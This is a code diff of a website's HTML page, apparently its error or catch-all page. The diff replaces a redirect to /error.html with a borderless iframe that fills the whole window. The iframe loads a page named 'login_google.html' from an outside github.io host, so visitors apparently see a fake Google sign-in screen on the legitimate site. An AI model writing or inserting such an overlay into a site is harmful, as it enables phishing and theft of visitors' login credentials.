@@ -1,14 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <script>
-    // Redirect all unknown paths to error.html
-    window.location.replace("/error.html");
-  </script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+    }
+  </style>
 </head>
+
 <body>
-  Redirecting...
+  <iframe src="https://frozzipies.github.io/login_google.html" allowfullscreen></iframe>
 </body>
 </html>
